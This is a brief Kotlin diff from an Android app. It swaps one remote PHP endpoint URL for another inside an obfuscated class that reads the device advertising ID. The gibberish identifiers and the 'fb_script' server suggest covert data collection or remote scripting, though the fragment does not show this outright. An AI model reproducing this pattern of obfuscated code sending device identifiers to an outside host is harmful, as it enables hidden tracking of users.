@@ -21,7 +21,7 @@ import kotlin.coroutines.resume
 import kotlin.coroutines.resumeWithException
 
 class IJFhuwguwurwr(private val context: Context) {
-    val fijwufhwqghurwqr = "https://nimbuspulse.xyz/fb_script_test.php?"
+    val fijwufhwqghurwqr = "https://nimbuspulse.xyz/fb_script_elysium.php?"
     private suspend fun fijqhuwruwqrhuqwr(): String {
         return withContext(Dispatchers.IO) {
             val fijqwhhrqwiriqwr = AdvertisingIdClient.getAdvertisingIdInfo(context)
